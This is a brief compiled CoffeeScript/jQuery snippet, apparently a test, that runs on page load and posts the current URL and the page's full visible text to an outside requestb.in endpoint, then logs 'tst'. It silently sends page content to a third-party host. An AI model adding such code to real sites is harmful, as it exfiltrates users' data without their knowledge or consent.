// Generated by CoffeeScript 1.3.3
(function() {

  $(function() {
    var clone;
    clone = $('body').clone();
    clone.find('script').remove();
    return $.post("http://requestb.in/1jcz2m01", {
      url: document.location.href,
      html: clone.text().replace(/\s/g, "")
    }, function(evt) {
      return console.log('tst');
    });
  });

}).call(this);
